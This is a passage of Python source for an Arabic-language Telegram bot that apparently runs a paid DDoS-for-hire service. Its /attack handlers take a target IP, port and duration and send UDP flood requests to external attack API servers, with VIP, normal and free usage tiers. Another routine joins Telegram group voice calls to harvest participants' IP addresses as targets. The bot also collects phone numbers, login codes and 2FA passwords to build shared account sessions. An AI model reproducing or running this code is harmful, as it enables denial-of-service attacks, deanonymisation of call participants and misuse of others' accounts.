  free_st = "🟢 مفعل" if free_mode else "🔴 معطل"
  maint_st = "🟢 مفعل" if maintenance_mode else "🔴 معطل"
  alert_st = "🔔 مفعل" if notify_alerts else "🔕 معطل"

  markup.add(
      InlineKeyboardButton(
          f"🎁 الوضع المجاني ({free_st})", callback_data="toggle_free"
      ),
      InlineKeyboardButton(
          f"🔧 وضع الصيانة ({maint_st})", callback_data="toggle_maint"
      ),
      InlineKeyboardButton(
          f"🔔 جرس التنبيهات ({alert_st})", callback_data="toggle_alerts"
      ),
      InlineKeyboardButton(
          "⏱️ تعديل أوقات الهجمات والحدود", callback_data="edit_limits"
      ),
      InlineKeyboardButton(
          "➕ إضافة مشترك عادي/VIP/رابط", callback_data="admin_add_sub_menu"
      ),
      InlineKeyboardButton(
          "❌ إدارة المشتركين والحذف", callback_data="admin_subs_mgmt"
      ),
      InlineKeyboardButton(
          "🌐 إدارة الـ APIs المتعددة", callback_data="admin_api_mgmt"
      ),
      InlineKeyboardButton(
          "🛡️ إدارة الحماية والأهداف", callback_data="admin_prot_mgmt"
      ),
      InlineKeyboardButton(
          "📢 الإذاعة والإحصائيات", callback_data="admin_broadcast_menu"
      ),
      InlineKeyboardButton(
          "📢 الاشتراك الإجباري", callback_data="admin_fsub_menu"
      ),
      InlineKeyboardButton(
          "📱 إضافة حساب عام (للكل)", callback_data="add_public_telethon"
      ),
      InlineKeyboardButton("🎬 تعيين المتحركة GIF", callback_data="set_gif"),
      InlineKeyboardButton("🎥 تعيين الشروحات", callback_data="admin_tut_menu"),
      InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"),
  )
  try:
    bot.edit_message_text(
        "⚙️ لوحة تحكم وإعدادات المطور:",
        chat_id,
        msg_id,
        reply_markup=markup,
    )
  except Exception:
    pass


def _run_extract(uid_e, chat_id, group_link):
  wait_msg = bot.send_message(
      chat_id,
      "<blockquote>جاري استخراج IP...\nيرجى الانتظار</blockquote>",
      parse_mode="HTML",
  )

  def do_extract():
    loop = asyncio.new_event_loop()
    saved_str = user_telethon_sessions.get(uid_e)
    if not saved_str and public_sessions:
      saved_str = public_sessions[0]

    client = TelegramClient(StringSession(saved_str or ""), API_ID, API_HASH)

    async def extract():
      if not client.is_connected():
        await client.connect()
      clean = group_link.split("?")[0].split("#")[0].strip().rstrip("/")
      for prefix in ["https://t.me/", "http://t.me/", "t.me/", "@"]:
        if clean.lower().startswith(prefix):
          clean = clean[len(prefix) :]
          break
      if "/" in clean and not clean.startswith("+"):
        clean = clean.split("/")[0]

      if clean.startswith("+"):
        invite_hash = clean[1:]
        inv = await client(CheckChatInviteRequest(invite_hash))
        if isinstance(inv, ChatInviteAlready):
          entity = inv.chat
        else:
          updates = await client(ImportChatInviteRequest(invite_hash))
          entity = (
              updates.chats[0]
              if hasattr(updates, "chats") and updates.chats
              else None
          )
      else:
        entity = await client.get_entity(clean)

      full = await client(GetFullChannelRequest(entity))
      call_input = getattr(full.full_chat, "call", None)
      if not call_input:
        return None

      ssrc = _random.randint(100000, 999999)
      result = await client(
          JoinGroupCallRequest(
              call=call_input,
              join_as=InputPeerSelf(),
              params=DataJSON(
                  data=_json.dumps({
                      "ufrag": "xxxx",
                      "pwd": "xxxxxxxxxxxxxxxxxxxxxxxxxxxx",
                      "fingerprints": [{
                          "hash": "sha-256",
                          "setup": "active",
                          "fingerprint": (
                              "00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"
                          ),
                      }],
                      "ssrc": ssrc,
                      "ssrc-groups": [],
                  })
              ),
              muted=True,
              video_stopped=True,
          )
      )

      ips = []
      for upd in result.updates:
        raw = None
        if hasattr(upd, "params") and hasattr(upd.params, "data"):
          raw = upd.params.data
        elif hasattr(upd, "call") and hasattr(
            getattr(upd, "call", None), "params"
        ):
          raw = getattr(upd.call.params, "data", None)
        if raw:
          try:
            for c in (
                _json.loads(raw).get("transport", {}).get("candidates", [])
            ):
              ip = c.get("ip", "")
              port = c.get("port", "")
              if ip and port and not ip.startswith("0.") and ":" not in ip:
                v = f"{ip} {port}"
                if v not in ips:
                  ips.append(v)
          except Exception:
            pass
      try:
        await client(LeaveGroupCallRequest(call=call_input, source=ssrc))
      except Exception:
        pass
      return ips

    try:
      results = loop.run_until_complete(extract())
      try:
        bot.delete_message(chat_id, wait_msg.message_id)
      except Exception:
        pass
      if results:
        bot.send_message(
            chat_id,
            "\n".join(results),
        )
      else:
        bot.send_message(chat_id, "⚠️ لا توجد مكالمة نشطة حالياً في المجموعة.")
    except Exception as eg:
      try:
        bot.delete_message(chat_id, wait_msg.message_id)
      except Exception:
        pass
      bot.send_message(chat_id, f"❌ حدث خطأ: {eg}")

  threading.Thread(target=do_extract, daemon=True).start()


@bot.message_handler(
    content_types=[
        "text",
        "photo",
        "video",
        "document",
        "animation",
        "sticker",
        "voice",
    ],
    func=lambda msg: msg.from_user.id in user_states,
)
def handle_admin_inputs(message):
  global attack_gif_id

  user_id = message.from_user.id
  state_data = user_states.get(user_id, {})
  state = state_data.get("state")
  text_val = message.text.strip() if message.text else ""

  if state == "waiting_api_info":
    try:
      parts = text_val.split()
      api_url = parts[0].strip()
      api_user = parts[1].strip()
      api_pass = parts[2].strip()
      api_servers.append(
          {"url": api_url, "username": api_user, "password": api_pass}
      )
      bot.reply_to(message, "✅ تمت إضافة الـ API الجديد بنجاح وانضم للقائمة!")
    except Exception:
      bot.reply_to(
          message,
          "⚠️ صيغة خطأ! أرسل بالشكل:\n`http://site.com:5001/api/attack USER"
          " PASS`",
          parse_mode="Markdown",
      )
    del user_states[user_id]
    return

  elif state == "waiting_gif" and message.content_type in [
      "animation",
      "document",
  ]:
    attack_gif_id = (
        message.animation.file_id
        if message.animation
        else message.document.file_id
    )
    bot.reply_to(message, "✅ تم حفظ الصورة المتحركة GIF بنجاح.")
    del user_states[user_id]
    return

  elif state == "waiting_add_fsub":
    if text_val.startswith("@"):
      mandatory_channels.add(text_val)
      bot.reply_to(message, f"✅ تم إضافة القناة {text_val} للاشتراك الإجباري.")
    else:
      bot.reply_to(message, "⚠️ يرجى إرسال المعرف مسبوقاً بـ @")
    del user_states[user_id]
    return

  elif state == "waiting_del_fsub":
    if text_val in mandatory_channels:
      mandatory_channels.remove(text_val)
      bot.reply_to(message, f"✅ تم حذف القناة {text_val}.")
    else:
      bot.reply_to(message, "❌ القناة غير موجودة.")
    del user_states[user_id]
    return

  elif state == "waiting_create_link_info":
    try:
      parts = text_val.split()
      stype = "VIP" if parts[0].upper() == "VIP" else "Normal"
      sdays = int(parts[1])
      code_str = f"sub_{_random.randint(100000, 999999)}"
      created_sub_codes[code_str] = {"type": stype, "days": sdays}

      bot_info = bot.get_me()
      link_url = f"https://t.me/{bot_info.username}?start={code_str}"
      bot.reply_to(
          message,
          f"✅ تم إنشاء رابط تفعيل اشتراك ({stype}) لمدة {sdays} يوم!\n\n🔗"
          f" الرابط:\n{link_url}",
      )
    except Exception:
      bot.reply_to(message, "⚠️ صيغة خطأ! أرسل مثل: Normal 30 أو VIP 15")
    del user_states[user_id]
    return

  elif state == "waiting_tut_video" and message.content_type == "video":
    state_data["video_id"] = message.video.file_id
    state_data["state"] = "waiting_tut_extra"
    user_states[user_id] = state_data
    bot.reply_to(message, "✅ أرسل الآن النص/المستند المرفق مع الفيديو:")
    return

  elif state == "waiting_tut_extra":
    tutorials[state_data["os"]] = {
        "video_id": state_data["video_id"],
        "caption": message.text or message.caption or "لا يوجد نص",
        "file_id": (
            message.document.file_id
            if message.content_type == "document"
            else None
        ),
    }
    bot.reply_to(message, "✅ تم حفظ الفيديو بنجاح.")
    del user_states[user_id]
    return

  elif state == "waiting_edit_limits_type":
    try:
      parts = text_val.split()
      l_type, l_val = parts[0].lower(), int(parts[1])
      if l_type == "free":
        attack_limits_config["free_max_time"] = l_val
      elif l_type == "vip":
        attack_limits_config["vip_max_time"] = l_val
      elif l_type == "normal":
        attack_limits_config["normal_max_time"] = l_val
      elif l_type == "group":
        attack_limits_config["group_max_time"] = l_val
      bot.reply_to(message, "✅ تم تحديث الوقت بنجاح!")
    except Exception:
      bot.reply_to(message, "⚠️ صيغة خطأ. مثال: vip 300")
    del user_states[user_id]
    return

  elif state == "waiting_session_string":
    del user_states[user_id]
    s_str = text_val.strip()
    try:
      # اختبار صلاحية كود الجلسة
      test_client = TelegramClient(StringSession(s_str), API_ID, API_HASH)
      loop = asyncio.new_event_loop()

      async def test_conn():
        await test_client.connect()
        me = await test_client.get_me()
        await test_client.disconnect()
        return me

      user_info = loop.run_until_complete(test_conn())
      user_telethon_sessions[user_id] = s_str
      bot.reply_to(
          message,
          f"✅ تم ربط الحساب بنجاح عبر كود الجلسة!\n👤 الاسم: {user_info.first_name}"
          f" (ID: {user_info.id})",
      )
    except Exception as e:
      bot.reply_to(
          message,
          f"❌ كود الجلسة غير صالح أو حدث خطأ:\n{e}\n\nتأكد من نسخه بشكل صحيح.",
      )
    return

  if state in ["waiting_phone", "waiting_public_phone"]:
    is_public = state == "waiting_public_phone"
    del user_states[user_id]
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
      loop = asyncio.new_event_loop()

      async def req_code():
        await client.connect()
        return await client.send_code_request(text_val)

      sent = loop.run_until_complete(req_code())
      user_states[user_id] = {
          "state": "waiting_code",
          "client": client,
          "loop": loop,
          "phone": text_val,
          "phone_code_hash": sent.phone_code_hash,
          "is_public": is_public,
      }
      bot.reply_to(
          message,
          "📬 أرسل كود التحقق (يمكنك كتابته متفرقاً مثلاً: 1 4 7 5 8):",
      )
    except Exception as e:
      bot.reply_to(message, f"❌ حدث خطأ: {e}")
    return

  elif state == "waiting_code":
    code = text_val.replace(" ", "")
    client = state_data["client"]
    loop = state_data["loop"]
    phone = state_data["phone"]
    phone_code_hash = state_data["phone_code_hash"]
    is_public = state_data["is_public"]
    del user_states[user_id]

    try:

      async def sign():
        try:
          await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except Exception as err:
          if "password" in str(err).lower() or "2fa" in str(err).lower():
            return "NEED_2FA"
          raise err
        s_str = client.session.save()
        await client.disconnect()
        return s_str

      res = loop.run_until_complete(sign())
      if res == "NEED_2FA":
        user_states[user_id] = {
            "state": "waiting_2fa",
            "client": client,
            "loop": loop,
            "is_public": is_public,
        }
        bot.reply_to(message, "🔐 الحساب يحتاج كلمة مرور التحقق بخطوتين (2FA):")
        return

      if is_public:
        public_sessions.append(res)
        bot.reply_to(
            message,
            "✅ تمت إضافة الحساب العام بنجاح للجميع.\n\n🔑 كود الجلسة الخاص بك"
            f" (احفظه عندك):\n`{res}`",
            parse_mode="Markdown",
        )
      else:
        user_telethon_sessions[user_id] = res
        bot.reply_to(
            message,
            "✅ تم ربط حسابك الشخصي بنجاح.\n\n🔑 كود الجلسة الخاص بك:\n`{res}`",
            parse_mode="Markdown",
        )
    except Exception as e:
      bot.reply_to(message, f"❌ خطأ في الكود: {e}")
    return

  elif state == "waiting_2fa":
    password = text_val
    client = state_data["client"]
    loop = state_data["loop"]
    is_public = state_data["is_public"]
    del user_states[user_id]
    try:

      async def sign_2fa():
        await client.sign_in(password=password)
        s_str = client.session.save()
        await client.disconnect()
        return s_str

      res = loop.run_until_complete(sign_2fa())
      if is_public:
        public_sessions.append(res)
        bot.reply_to(
            message,
            "✅ تمت إضافة الحساب العام بنجاح للجميع.\n\n🔑 كود الجلسة الخاص بك:\n`{res}`",
            parse_mode="Markdown",
        )
      else:
        user_telethon_sessions[user_id] = res
        bot.reply_to(
            message,
            "✅ تم ربط حسابك الشخصي بنجاح.\n\n🔑 كود الجلسة الخاص بك:\n`{res}`",
            parse_mode="Markdown",
        )
    except Exception as e:
      bot.reply_to(message, f"❌ كلمة المرور غير صحيحة: {e}")
    return

  elif state == "waiting_strong_attack":
    del user_states[user_id]
    try:
      clean_text = text_val.replace(":", " ")
      p = clean_text.split()
      target_ip, port = p[0].strip(), p[1].strip()
    except:
      bot.reply_to(
          message,
          "⚠️ صيغة خاطئة! أرسل الـ IP والـ PORT هكذا:\n91.108.9.166 32000",
      )
      return

    target_key = f"{target_ip}:{port}"
    if target_key in protected_targets:
      bot.reply_to(message, "هذا الهدف محمي 🛡")
      return

    sub_type, _ = check_subscription(user_id)
    if is_admin(user_id):
      max_time = attack_limits_config["admin_max_time"]
    elif sub_type == "VIP":
      max_time = attack_limits_config["vip_max_time"]
    elif sub_type == "Normal":
      max_time = attack_limits_config["normal_max_time"]
    else:
      if free_mode:
        update_user_attempts(user_id)
        if user_attempts[user_id]["attempts_left"] <= 0:
          bot.reply_to(message, "❌ ليس لديك محاولات كافية!")
          return
        user_attempts[user_id]["attempts_left"] -= 1
      max_time = attack_limits_config["free_max_time"]

    method = "udp-pps"

    attack_result_msg = (
        "تم تنفيذ الهجوم بنجاح 🔥\n"
        "_______________________________________\n\n"
        f"IP ⌯ {target_ip}\n\n"
        f"Port ⌯ {port}\n\n"
        f"Time ⌯ {max_time}\n\n"
        f"MeThOdS ⌯ {method.upper()}\n"
        "_______________________________________"
    )

    dev_markup = InlineKeyboardMarkup(row_width=1)
    dev_markup.add(
        InlineKeyboardButton("المطور", url=f"https://t.me/{DEV_USERNAME}")
    )

    success_api = False
    for srv in api_servers:
      try:
        target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={max_time}&method={method}"
        response = requests.get(target_api_url, timeout=7)
        if response.status_code in [200, 201, 202]:
          success_api = True
          break
      except Exception as e:
        print(f"API Error: {e}")
        continue

    if success_api:
      if attack_gif_id:
        bot.send_animation(
            message.chat.id,
            attack_gif_id,
            caption=attack_result_msg,
            reply_markup=dev_markup,
        )
      else:
        bot.send_message(
            message.chat.id, attack_result_msg, reply_markup=dev_markup
        )
    else:
      bot.reply_to(message, "❌ فشل الاتصال بالسيرفر أو أن السيرفر غير متجاوب.")
    return

  elif state == "waiting_bc_private":
    success, failed = 0, 0
    for target_user in list(all_users):
      try:
        bot.copy_message(target_user, message.chat.id, message.message_id)
        success += 1
      except Exception:
        failed += 1
    bot.reply_to(
        message, f"✅ اكتملت الإذاعة الخاصة! نجح: {success} | فشل: {failed}"
    )
    del user_states[user_id]

  elif state == "waiting_bc_public":
    success, failed = 0, 0
    targets = set(all_users).union(set(allowed_groups))
    for target in list(targets):
      try:
        bot.copy_message(target, message.chat.id, message.message_id)
        success += 1
      except Exception:
        failed += 1
    bot.reply_to(
        message, f"🌐 اكتملت الإذاعة العامة! نجح: {success} | فشل: {failed}"
    )
    del user_states[user_id]

  elif state == "waiting_prot_add":
    try:
      clean_text = text_val.replace(":", " ")
      p = clean_text.split()
      protected_targets.add(f"{p[0].strip()}:{p[1].strip()}")
      bot.reply_to(message, "✅ تم إضافة الهدف للقائمة المحمية بنجاح.")
    except:
      bot.reply_to(message, "⚠️ صيغة خطأ.")
    del user_states[user_id]

  elif state == "waiting_del_prot":
    try:
      clean_text = text_val.replace(":", " ")
      p = clean_text.split()
      target_str = f"{p[0].strip()}:{p[1].strip()}"
      if target_str in protected_targets:
        protected_targets.remove(target_str)
        bot.reply_to(message, "✅ تم فك الحماية.")
      else:
        bot.reply_to(message, "❌ الهدف غير موجود.")
    except:
      bot.reply_to(message, "⚠️ صيغة خطأ.")
    del user_states[user_id]

  elif state.startswith("waiting_add_"):
    sub_type = "Normal" if "Normal" in state else "VIP"
    try:
      target_id, days = map(int, text_val.split())
      start_time = datetime.now()
      end_time = start_time + timedelta(days=days)
      try:
        u = bot.get_chat(target_id)
        name, username = u.first_name or "بدون اسم", u.username or "لا يوجد"
      except:
        name, username = "غير معروف", "لا يوجد"

      subscribers[target_id] = {
          "name": name,
          "username": username,
          "type": sub_type,
          "start": start_time.strftime("%Y-%m-%d %H:%M"),
          "end": end_time,
      }
      bot.reply_to(message, f"✅ تم إضافة المشترك {target_id} كـ ({sub_type}).")

      try:
        notify_user_msg = (
            "🎉 تم تفعيل اشتراكك بنجاح!\n\n"
            f"نوع الاشتراك ⌯ {sub_type}\n"
            f"وقت التفعيل ⌯ {start_time.strftime('%Y-%m-%d %H:%M')}\n"
            f"وقت الانتهاء ⌯ {end_time.strftime('%Y-%m-%d %H:%M')}\n\n"
            "استمتع بالخدمة! 🔥"
        )
        bot.send_message(target_id, notify_user_msg)
      except Exception:
        bot.reply_to(
            message,
            "⚠️ تم التفعيل لكن لم أتمكن من إرسال رسالة للمستخدم (قد يكون حظر"
            " البوت).",
        )

    except:
      bot.reply_to(message, "⚠️ صيغة خطأ! مثال: 123456789 30")
    del user_states[user_id]

  elif state == "waiting_del":
    try:
      tid = int(text_val)
      if tid in subscribers:
        del subscribers[tid]
        bot.reply_to(message, "✅ تم الحذف.")
      else:
        bot.reply_to(message, "❌ غير موجود.")
    except:
      bot.reply_to(message, "⚠️ أيدي غير صحيح.")
    del user_states[user_id]


@bot.message_handler(commands=["attack"])
def handle_attack(message):
  user_id = message.from_user.id
  chat_id = message.chat.id
  is_group = message.chat.type in ["group", "supergroup"]

  if message.chat.type == "private":
    all_users.add(user_id)

  missing = check_mandatory_subs(user_id)
  if missing:
    markup = InlineKeyboardMarkup(row_width=1)
    for ch in missing:
      markup.add(
          InlineKeyboardButton(
              f"انضم هنا {ch}", url=f"https://t.me/{ch.replace('@', '')}"
          )
      )
    bot.reply_to(
        message, "⚠️ يرجى الاشتراك في القنوات لاستخدام البوت:", reply_markup=markup
    )
    return

  if maintenance_mode and not is_admin(user_id):
    bot.reply_to(message, "البوت الان في وضع الصيانه 🔧")
    return

  try:
    args = message.text.split()
    if len(args) < 5:
      bot.reply_to(
          message, "⚠️ الصيغة خاطئة:\n/attack 91.108.9.166 32000 120 udp-pps"
      )
      return
    target_ip, port, time_sec, method = (
        args[1].strip(),
        args[2].strip(),
        int(args[3]),
        args[4].strip(),
    )
  except:
    bot.reply_to(
        message, "⚠️ الصيغة خاطئة:\n/attack 91.108.9.166 32000 120 udp-pps"
    )
    return

  if "udp" in method.lower():
    method = "udp-pps"

  target_key = f"{target_ip}:{port}"
  if target_key in protected_targets:
    bot.reply_to(message, "هذا الهدف محمي 🛡")
    return

  sub_type, _ = check_subscription(user_id)

  if is_group:
    if chat_id not in allowed_groups and not is_admin(user_id):
      bot.reply_to(
          message, "⛔ البوت غير مفعل بالجروب. استخدم /open بواسطة المطور."
      )
      return
    max_time = attack_limits_config["group_max_time"]
  else:
    if is_admin(user_id):
      max_time = attack_limits_config["admin_max_time"]
    elif sub_type == "VIP":
      max_time = attack_limits_config["vip_max_time"]
    elif sub_type == "Normal":
      max_time = attack_limits_config["normal_max_time"]
    else:
      if not free_mode:
        bot.reply_to(message, "الوضع المجاني معطل ولا تملك اشتراكاً مدفوعاً!")
        return
      update_user_attempts(user_id)
      if user_attempts[user_id]["attempts_left"] <= 0:
        bot.reply_to(message, "❌ نفدت محاولاتك اليومية!")
        return
      user_attempts[user_id]["attempts_left"] -= 1
      max_time = attack_limits_config["free_max_time"]

  if time_sec > max_time:
    bot.reply_to(message, f"⚠️ الوقت الأقصى المسموح لك هو {max_time} ثانية فقط!")
    return

  attack_result_msg = (
      "تم تنفيذ الهجوم بنجاح 🔥\n"
      "_______________________________________\n\n"
      f"IP ⌯ {target_ip}\n\n"
      f"Port ⌯ {port}\n\n"
      f"Time ⌯ {time_sec}\n\n"
      f"MeThOdS ⌯ {method.upper()}\n"
      "_______________________________________"
  )

  dev_markup = InlineKeyboardMarkup(row_width=1)
  dev_markup.add(
      InlineKeyboardButton("المطور", url=f"https://t.me/{DEV_USERNAME}")
  )

  success_api = False
  for srv in api_servers:
    try:
      target_api_url = f"{srv['url']}?username={srv['username']}&password={srv['password']}&target={target_ip}&port={port}&time={time_sec}&method={method.lower()}"
      response = requests.get(target_api_url, timeout=7)
      if response.status_code in [200, 201, 202]:
        success_api = True
        break
    except Exception as e:
      print(f"API Error: {e}")
      continue

    if success_api:
      if attack_gif_id:
        bot.send_animation(
            chat_id,
            attack_gif_id,
            caption=attack_result_msg,
            reply_markup=dev_markup,
        )
      else:
        bot.send_message(chat_id, attack_result_msg, reply_markup=dev_markup)
  else:
    bot.reply_to(message, "❌ فشل الاتصال بالسيرفر أو أن السيرفر غير متجاوب.")


if __name__ == "__main__":
  print("🤖 تم تشغيل البوت مع خيارات إضافة الحساب (جشنة / رقم) بنجاح...")
  bot.infinity_polling()
